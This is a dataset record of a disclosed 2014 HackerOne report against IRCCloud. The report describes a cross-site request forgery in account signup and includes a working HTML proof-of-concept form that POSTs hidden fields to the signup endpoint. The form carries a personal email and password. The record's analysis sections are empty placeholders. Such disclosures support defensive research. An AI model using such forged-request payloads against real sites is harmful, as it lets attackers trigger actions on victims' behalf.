---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '7051'
original_report_id: '7051'
title: User Account Creation CSRF
weakness: Cross-Site Request Forgery (CSRF)
team_handle: irccloud
created_at: '2014-04-11T06:07:37.055Z'
disclosed_at: '2014-06-25T10:08:16.205Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# User Account Creation CSRF

## Metadata

- HackerOne Report ID: 7051
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: irccloud
- Disclosed At: 2014-06-25T10:08:16.205Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Any One Account Can be created and display home screen 
<html>
  <!-- CSRF PoC chandrakant->
  <body>
    <form action="https://www.irccloud.com/chat/signup" method="POST">
      <input type="hidden" name="email" value="chandra.kantnial8&#64;gmail&#46;com" />
      <input type="hidden" name="password" value="chandra1" />
      <input type="hidden" name="realname" value="chandrakant1" />
      <input type="hidden" name="invite" value="" />
      <input type="hidden" name="org&#95;invite" value="" />
      <input type="hidden" name="&#95;reqid" value="1" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

Please Fix this

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
